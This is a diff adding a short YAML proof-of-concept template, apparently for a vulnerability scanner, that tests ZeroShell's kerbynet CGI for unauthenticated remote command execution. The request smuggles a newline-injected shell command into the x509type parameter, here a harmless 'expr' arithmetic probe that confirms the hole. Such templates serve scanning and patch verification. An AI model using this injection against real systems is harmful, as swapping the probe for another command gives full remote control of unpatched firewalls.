@@ -1,0 +1,15 @@
+name: poc-yaml-zeroshell-rce
+set:
+  r1: randomInt(1000,10000)
+  r2: randomInt(1000,10000)
+rules:
+  - method: GET
+    path: /cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0Aexpr%20{{r1}}%20-%20{{r2}}%0A%27
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(string(r1-r2)))
+
+detail:
+  author: Print1n(http://print1n.top)
+  links:
+    - https://mp.weixin.qq.com/s/GglQ_1vCECs2E1nySiTQ6Q
